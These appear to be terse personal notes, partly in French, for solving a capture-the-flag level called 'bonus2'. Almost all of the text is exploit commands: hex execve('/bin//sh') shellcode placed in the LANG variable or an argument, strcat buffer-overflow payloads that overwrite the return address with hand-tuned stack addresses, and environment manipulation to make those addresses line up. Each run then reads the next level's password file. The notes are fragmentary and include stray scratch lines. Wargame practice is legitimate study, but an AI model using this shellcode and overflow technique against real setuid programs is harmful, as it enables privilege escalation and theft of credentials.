 export LANG=$(printf "fi\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80")
 ./bonus2 $(python -c "print('a'*40)") $(python -c "print('b'*18 + '\xbf\xff\xff\x1b'[::-1] + 'c'*20)")

 export LANG = 0xbffffed1 = '\xbf\xff\xfe\xd1'[::-1] + 0

 0xbffffed1 = "r/games"

 '\xbf\xff\xfe\xd1'[::-1] + 2

 0xbfffff19

 adrss strca0xbffff5c0

 0xbffff5d2


  ./bonus2 $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xf5\xd2'[::-1] + 'c'*20)")


  0xbffff5f2 strcat + 18

export LANG=fi; /home/user/bonus2/bonus2 $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xf5\xf2'[::-1] + 'c'*20)")


0xbffff5f2


term - 5 = 0xbffff921
term + 3 = 0xbffff928


lang= = 0xbfffffda

0xbffffcd0 + 18 = 0xbffffce8
relancer la session pour clear l'env

$(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfc\xfc'[::-1])") 

0xbffffcd8

$(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfc\xf2'[::-1])") 



env -i LANG=fi /home/user/bonus2/bonus2 $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfd\x12'[::-1])") <<< 'cat /home/user/bonus3/.pass'



bffffcf2 = nice
bffffd32 = bof

32 de diff entre gdb et le binaire


$(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfc\xf2'[::-1])") <<< 'cat /home/user/bonus3/.pass'


enlever l'env avec gdb ou sans = `0xbffffcf2`
- echo $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") > /tmp/test
- echo $(python -c "print('b'*18 + '\xbf\xff\xfc\xf2'[::-1])") > /tmp/test2
- unset $(env | cut -d= -f1)
- export LANG=fi
- $(/bin/cat /tmp/test) $(/bin/cat /tmp/test2) <<< "cat '/home/user/bonus3/.pass'"

version sans niquer l'env:
echo $(echo $(unset $(env | cut -d= -f1); export LANG=fi; /home/user/bonus2/bonus2 $(/usr/bin/python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(/usr/bin/python -c "print('b'*18 + '\xbf\xff\xfc\xf2'[::-1])") <<< 'cat /home/user/bonus3/.pass'))


enlever l'env avec commande `env -i LANG=fi` = `0xbffffd12`
env -i LANG=fi /home/user/bonus2/bonus2 $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*16)") $(python -c "print('b'*18 + '\xbf\xff\xfd\x12'[::-1])") <<< 'cat /home/user/bonus3/.pass'

cat /home/user/bonus2/.pass

